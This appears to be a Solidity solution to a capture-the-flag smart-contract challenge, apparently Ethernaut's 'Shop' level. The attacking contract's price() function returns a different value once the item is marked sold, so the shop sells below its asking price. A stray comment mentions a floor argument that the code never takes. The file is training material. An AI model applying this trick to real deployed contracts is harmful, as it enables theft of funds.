// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract Solution is Buyer {
    Shop public immutable shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) return 99;
        return 100;
    }

    // pass in your instance address and any number (positive) as the floor
    function solve() external {
        shop.buy();
    }
}